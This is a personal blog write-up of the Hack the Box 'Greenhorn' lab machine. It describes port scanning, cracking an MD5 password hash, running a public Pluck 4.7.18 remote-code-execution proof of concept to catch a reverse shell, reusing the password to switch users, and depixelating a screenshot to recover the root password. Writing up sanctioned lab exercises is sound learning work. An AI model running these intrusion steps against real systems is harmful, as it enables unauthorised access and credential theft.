---
draft: false
title: "Hack the Box #6 - Greenhorn w/o Metasploit"
date: 2024-09-24
author: William
category:
  - Tech
tags:
  - Security
  - Hacking
  - Linux
description: Detailed Hack the Box Greenhorn write-up where I share the full process of enumeration, exploitation, and privilege escalation. From cracking MD5 hashes to leveraging a PoC for a reverse shell, and even using a de-pixelling tool for root access, this guide takes you through the challenges and solutions of this HTB box. Perfect for CTF enthusiasts looking for in-depth insights and a step-by-step breakdown of exploiting Greenhorn!
cover:
  image: GreenHorn.png
  alt: GreenHorn.png
---

I would be lying if I said I posted this Hack the Box Greenhorn writeup within the same week of me exploiting it. In truth life happened. I did a SANs and a couple of late nights out. But here it is, my greenhorn writeup. 

## Enumeration
Lets start as we always do after booting up the box and have a look at what ports are available to us with an nmap.
```bash
└─$ nmap -sV -p- 10.10.11.25 -oN nmap.scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-19 22:55 BST
Nmap scan report for 10.10.11.25
Host is up (0.056s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
3000/tcp open  ppp?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=9/19%Time=66EC9DF4%P=x86_64-pc-linux-gnu%r
...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.25 seconds
```

Port 22 and 80 are pretty standard. SSH and a basic webserver. But what is this port 3000 you might ask?  Hitting port 3000 from the browser we are greeted with...
![Gitea](https://about.gitea.com/gitea-text.svg)
Gitea is a self-hosted GitHub which I have considered hosting myself from time to time. 
In poking around we find a repository on Gitea for a software called pluck. They were even kind enough to in include the version 4.7.18

Going to google and using my extensive searching knowledge by typing "pluck 4.7.18 Exploit poc Github" and we find this lovely [repo](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC)

Cool beans so we have an exploit but when looking at the exploit we need to authenticate for that.

Rummaging through the repo some more we find that MD5 hash is used to encrypt passwords, this is a very secure choice if you want to get pwned! These guys know what they are doing!!! And with a little bit more rummaging we find under the settings folder there is a file called pass.php with a suspiciously MD5 looking hash

Taking that badboy and throwing it into [crackstation.net](https://crackstation.net/), we have a match!!! `iloveyou1` awww i love you to greenhorn. Now that we have everything we need lets have a look at this pluck webserver running on port 80.

Navigating to the login page we only need to put in a password. Great with a quick `iloveyou1` we are logged in! Now we can leverage the sweet sweet remote code execution PoC we found earlier.

## Exploitation
Lets take a closer look at the script we have. It requires the following details to execute correctly

```bash
login_url = "http://<hostname>/login.php"
upload_url = "http://<hostname>/admin.php?action=installmodule"
headers = {"Referer": login_url,}
login_payload = {"cont1": "<password>","<username>": "","submit": "Log in"}
```

`Hostname` and `password` we already have. For the `username` we can inspect the login payload, either through developer tools or burp (Yes we are running everything though our burp proxy).
We get the user `bogus`

Customizing the payload inline with this information we prepare out netcat to listen for the call home. And after executing the script we get catch a reverse shell.

```bash
└─# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.62] from (UNKNOWN) [10.10.11.25] 44696
SOCKET: Shell has connected! PID: 84927
whoami
www-data
```

Boom. Looks like we are running the the www-data context but its something. Looking around the box we find two users `git` and `junior` git we get permission denied but junior!!!

```bash
ls /home/junior
Using OpenVAS.pdf
archivo.pdf
linpeas.sh
user.txt
```

Boys rocking linpeas like a pro! Saddly for user.txt we get permission denied. CAN YOU blame me... It was worth the try. We need to achieve persistence. SSH to the box fails, with junior being locked down with a public key.

Nothing much else of interest after poking around for a bit longer. I got to the point of insanity where I was trying to extract the .pdf files by writing my own custom HTTP server that would accept POST requests it dawned on me. What if...

```bash
su junior
Password: iloveyou1
whoami
junior

cat user.txt
============ USER_FLAG ============ 

```

![table_flip](https://i.giphy.com/sIE0hveuiwCNG.webp#center)
## Privilege Escalation 

After taking a break to sooth my stupidity, I come back to my computer ready for round 2. We can now look at the PDF files by hosting an http server on the box and pull the files to our kali box

```bash
python3 -m http.server

-------
└─$ wget <http://10.10.11.25:8080/Using\\> OpenVAS.pdf
```

Opening it we get this lovely document. I literally muttered you little bitch when I saw it.
![image.png](https://i.imgur.com/DqVqGGd.png)

WHO THE FUCK SCRAMBLES THIER PASSWORDS LIKE THIS! WHO IN THIER RIGHT MIND WILL DO THIS!!! 
It looks like some sort of image scrambling has taken place that we need to unscrable. After looking around we find this lovely repo that can help us out.

[https://github.com/spipm/Depix](https://github.com/spipm/Depix)

this will unpixulate the file

```bash
└─$ python depix.py -p ../pix.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png 

```
Go from this
![image.png](https://i.imgur.com/sQ4XjKl.png)

 to this
![image.png](https://i.imgur.com/vAruc7U.png)

Now we follow the guide and use this for root access

```bash
└─$ ssh root@10.10.11.25  
root@10.10.11.25 password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)

...

Last login: Thu Jul 18 12:55:08 2024 from 10.10.14.41
root@greenhorn:~#

root@greenhorn:~# cat root.txt 
============ROOT_FLAG============
```


And  like that we have root. YAY! 
To be honest not my favourite HTB CTF I have done. Getting a foot hold was fun, but the unscrambling of the password though cool just annoyed me. But anyway I'm going to go touch grass and oh here is the [proof of my accomplishment](https://www.hackthebox.com/achievement/machine/1695260/617). 

![Grass](https://i.giphy.com/phFw0JVlNfXCE.webp#center)